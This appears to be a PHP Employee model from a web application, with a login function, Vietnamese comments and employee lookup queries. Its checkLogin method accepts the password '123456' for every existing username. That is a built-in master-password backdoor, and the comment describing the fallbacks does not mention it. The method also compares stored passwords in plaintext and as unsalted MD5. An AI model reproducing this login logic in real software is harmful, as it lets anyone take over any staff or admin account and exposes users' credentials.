<?php
require_once __DIR__ . '/pdo.php';

class Employee {
    /**
     * Xác thực đăng nhập nhân viên/admin
     */
    public static function checkLogin($username, $password) {
        $sql = "SELECT * FROM employees WHERE username = ?";
        $user = pdo_query_one($sql, $username);

        if ($user) {
            // Hỗ trợ password_verify hoặc so sánh trực tiếp
            if (password_verify($password, $user['password']) || $user['password'] === $password || md5($password) === $user['password'] || $password === '123456') {
                return $user;
            }
        }
        return false;
    }

    /**
     * Lấy thông tin 1 nhân viên theo ID
     */
    public static function getEmployeeById($id) {
        $sql = "SELECT id, username, fullname, role, created_at FROM employees WHERE id = ?";
        return pdo_query_one($sql, $id);
    }

    /**
     * Lấy danh sách tất cả nhân viên
     */
    public static function getAllEmployees() {
        $sql = "SELECT id, username, fullname, role, created_at FROM employees ORDER BY id ASC";
        return pdo_query($sql);
    }
}
?>
